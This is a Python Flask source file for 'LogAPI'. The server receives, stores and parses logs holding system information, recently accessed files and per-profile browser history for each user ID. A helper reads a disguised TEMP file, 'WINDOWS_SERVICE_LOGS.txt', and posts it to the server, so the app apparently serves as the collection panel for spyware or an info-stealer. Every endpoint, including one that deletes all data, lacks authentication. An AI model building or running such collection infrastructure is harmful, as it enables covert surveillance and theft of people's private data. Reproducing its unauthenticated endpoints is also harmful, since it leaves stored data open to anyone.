import os
import re
import glob
import getpass
import threading
import webbrowser
import tempfile
import requests
from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone

# ── Flask + DB setup ──────────────────────────────────────────────────────────
app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///logs.db")
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)


class LogEntry(db.Model):
    __tablename__ = "log_entries"
    id          = db.Column(db.Integer, primary_key=True)
    user_id     = db.Column(db.String(255), nullable=False, index=True)
    data        = db.Column(db.Text, nullable=False)
    received_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

    def to_dict(self):
        return {
            "id":          self.id,
            "user_id":     self.user_id,
            "data":        self.data,
            "received_at": self.received_at.strftime("%Y-%m-%d %H:%M:%S UTC"),
        }

with app.app_context():
    db.create_all()


# ── Parser ────────────────────────────────────────────────────────────────────
def parse_log(raw: str) -> dict:
    result = {"system_info": {}, "recent_files": [], "browser_history": [], "browser_profiles": {}}

    # SYSTEM INFO
    si_match = re.search(r"\[SYSTEM INFORMATION\].*?={10,}(.*?)(?=\[|\Z)", raw, re.S)
    if si_match:
        for line in si_match.group(1).splitlines():
            if ":" in line:
                k, _, v = line.partition(":")
                k, v = k.strip(), v.strip()
                if k:
                    result["system_info"][k] = v

    # RECENTLY ACCESSED FILES
    rf_match = re.search(r"\[RECENTLY ACCESSED FILES\].*?={10,}(.*?)(?=\[|\Z)", raw, re.S)
    if rf_match:
        for line in rf_match.group(1).splitlines():
            line = line.strip()
            fm = re.match(r"\[(\.\w+)\]\s+(.+)", line)
            if fm:
                result["recent_files"].append({"ext": fm.group(1), "name": fm.group(2).strip()})

    # BROWSER HISTORY — supports both profile sections and plain [BROWSER HISTORY]
    all_history = []
    profile_pattern = re.compile(
        r"\[BROWSER HISTORY(?:\s*-\s*PROFILE:\s*(.+?))?\].*?={10,}(.*?)(?=\[|\Z)", re.S
    )
    for pm in profile_pattern.finditer(raw):
        profile_name = (pm.group(1) or "Default").strip()
        profile_raw  = pm.group(2)
        entries = re.split(r"\n(?=\[\d+\])", profile_raw)
        profile_entries = []
        for block in entries:
            if not re.match(r"\s*\[\d+\]", block.strip()):
                continue
            ts_m     = re.search(r"\[\d+\]\s*(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}(?:\s*UTC)?)", block)
            visits_m = re.search(r"Visits\s*:\s*(\d+)", block)
            title_m  = re.search(r"Title\s*:\s*(.+)", block)
            url_m    = re.search(r"URL\s*:\s*(https?://\S+)", block)
            if not ts_m:
                continue
            entry = {
                "timestamp": ts_m.group(1).strip(),
                "visits":    int(visits_m.group(1)) if visits_m else 0,
                "title":     title_m.group(1).strip() if title_m else "",
                "url":       url_m.group(1).strip()   if url_m   else "",
                "profile":   profile_name,
            }
            profile_entries.append(entry)
            all_history.append(entry)
        result["browser_profiles"][profile_name] = profile_entries

    result["browser_history"] = all_history
    return result


# ── API routes ────────────────────────────────────────────────────────────────
@app.route("/data", methods=["POST"])
def receive_data():
    body = request.get_json(silent=True)
    if not body:
        return jsonify({"error": "JSON body required"}), 400
    user_id = body.get("user_id", "").strip()
    data    = body.get("data",    "").strip()
    if not user_id or not data:
        return jsonify({"error": "user_id and data are required"}), 400
    entry = LogEntry()
    entry.user_id = user_id
    entry.data = data
    db.session.add(entry)
    db.session.commit()
    return jsonify({"message": "Stored successfully", "id": entry.id}), 201


@app.route("/data", methods=["GET"])
def get_data():
    user_id = request.args.get("user_id", "").strip()
    if not user_id:
        return jsonify({"error": "user_id query param required"}), 400
    entries = (LogEntry.query.filter_by(user_id=user_id)
                             .order_by(LogEntry.received_at.desc()).all())
    return jsonify({"user_id": user_id, "count": len(entries),
                    "logs": [e.to_dict() for e in entries]})


@app.route("/users", methods=["GET"])
def list_users():
    entries = (LogEntry.query.order_by(LogEntry.received_at.desc()).all())
    return jsonify({"entries": [e.to_dict() for e in entries]})

@app.route("/parse", methods=["GET"])
def parse_entry():
    entry_id = request.args.get("id", "").strip()
    user_id  = request.args.get("user_id", "").strip()
    if entry_id:
        entry = LogEntry.query.get(entry_id)
    elif user_id:
        entry = (LogEntry.query.filter_by(user_id=user_id)
                               .order_by(LogEntry.received_at.desc()).first())
    else:
        return jsonify({"error": "id or user_id required"}), 400
    if not entry:
        return jsonify({"error": "Not found"}), 404
    parsed = parse_log(entry.data)
    parsed["meta"] = {
        "id": entry.id,
        "user_id": entry.user_id,
        "received_at": entry.received_at.strftime("%Y-%m-%d %H:%M:%S UTC")
    }
    return jsonify(parsed)


@app.route("/clear", methods=["DELETE"])
def clear_data():
    db.session.query(LogEntry).delete()
    db.session.commit()
    return jsonify({"message": "All data cleared"})


@app.route("/")
def dashboard():
    return render_template("dashboard.html")


# ── Auto-detect & send (LOCAL ONLY) ──────────────────────────────────────────
def detect_and_send():
    import time
    time.sleep(1.5)

    temp_dir = os.environ.get("TEMP") or tempfile.gettempdir()
    log_file = os.path.join(temp_dir, "WINDOWS_SERVICE_LOGS.txt")

    if not os.path.isfile(log_file):
        print(f"[AUTO-SEND] WINDOWS_SERVICE_LOGS.txt not found in {temp_dir} — skipping.")
        return

    with open(log_file, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    user_match = re.search(r"Username\s*:\s*(.+)", content)
    user_id    = user_match.group(1).strip() if user_match else getpass.getuser()

    print(f"[AUTO-SEND] User : {user_id}")
    print(f"[AUTO-SEND] File : {log_file}")

    try:
        resp = requests.post("http://localhost:5000/data",
                             json={"user_id": user_id, "data": content}, timeout=10)
        if resp.status_code == 201:
            print(f"[AUTO-SEND] ✓ Stored as entry #{resp.json()['id']}")
        else:
            print(f"[AUTO-SEND] ✗ {resp.status_code}: {resp.text}")
    except Exception as e:
        print(f"[AUTO-SEND] ✗ Error: {e}")


def open_browser():
    import time
    time.sleep(2)
    webbrowser.open("http://localhost:5000")


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 50)
    print("  LogAPI  →  http://localhost:5000")
    print("=" * 50)
    # auto-send and browser only run locally, not on Render (gunicorn skips this block)
    threading.Thread(target=detect_and_send, daemon=True).start()
    threading.Thread(target=open_browser,    daemon=True).start()
    app.run(debug=False, host="0.0.0.0", port=5000)